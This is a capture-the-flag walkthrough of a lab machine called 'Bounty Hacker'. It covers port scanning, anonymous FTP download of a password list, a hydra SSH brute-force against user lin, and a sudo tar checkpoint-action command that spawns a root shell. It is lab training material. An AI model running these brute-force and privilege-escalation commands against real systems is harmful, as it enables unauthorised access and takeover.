# Bounty Hacker

## Scanning and Enumeration

IP - 10.10.118.213


nmap scan:
```
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.6.41.41
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|Can't get directory listing: TIMEOUT
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|http-title: Site doesn't have a title (text/html).
| http-methods:
|  Supported Methods: GET HEAD POST OPTIONS
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 (97%), Android 9 - 10 (Linux 4.9 - 4.14) (93%), Linux 2.6.32 - 3.13 (93%), Linux 3.2 - 4.14 (93%), Linux 4.15 - 5.19 (93%), Linux 2.6.32 - 3.10 (93%), Linux 5.4 (92%), Linux 3.10 - 4.11 (91%), Linux 2.6.32 - 3.5 (89%), HP P2000 G3 NAS device (88%)
```
dirsearch:
```
[19:39:16] 301 -   315B - /images  ->  http://10.10.118.213/images/

[19:39:16] 200 -   938B - /images/

[19:39:17] 200 -   969B - /index.html

[19:39:31] 403 -   278B - /server-status/

[19:39:31] 403 -   278B - /server-status
```

## FTP Server Access and File Transfer
Successfully logged into FTP server using Anonymous as username.


![image](https://github.com/user-attachments/assets/c36409e5-bd4d-4771-87b8-494bae4b3a18)

after typing "ls" and waiting for few seconds I found two .txt files

![image](https://github.com/user-attachments/assets/4ec8fd12-fa0d-4331-8031-166deb645f1f)

When running this command ``` wget --ftp-user=Anonymous ftp://10.10.118.213/locks.txt ``` to transfer the files over to my machine I got an error: "==> PASV ... couldn't connect to 10.10.118.213 port 18667: Connection timed out"

I successfully got it to work after changing the command to - ``` wget --ftp-user=Anonymous --no-passive-ftp ftp://10.10.118.213/locks.txt ```

![image](https://github.com/user-attachments/assets/242a97c5-1854-46aa-aa15-c6bbd181a4ef)


Found out that the person who wrote task list is Lin

![image](https://github.com/user-attachments/assets/7ff5ad08-3daf-4fe4-927a-a79f494140c1)

## SSH Brute Force using Hydra

Used locks.txt file to brute force ssh by using this command - ``` hydra -l lin -P locks.txt -t 4 -V ssh://10.10.27.97  ```

![image](https://github.com/user-attachments/assets/b822493c-cb95-4544-8c0b-5b1c18b38486)

Successfully logged into SSH and got the user.txt flag

![image](https://github.com/user-attachments/assets/35e53d7a-c3c2-4a78-80e8-d99df17ee26d)

## Privilege Escalation

Found lin's permissions -
``` 
lin@bountyhacker:/$ sudo -l
User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

To get elevated permissions to root I used this command - ``` sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh ```


reference - https://gtfobins.github.io/gtfobins/tar/#sudo

![image](https://github.com/user-attachments/assets/a91470bb-8a99-45c2-aa8c-08f4518b42f6)




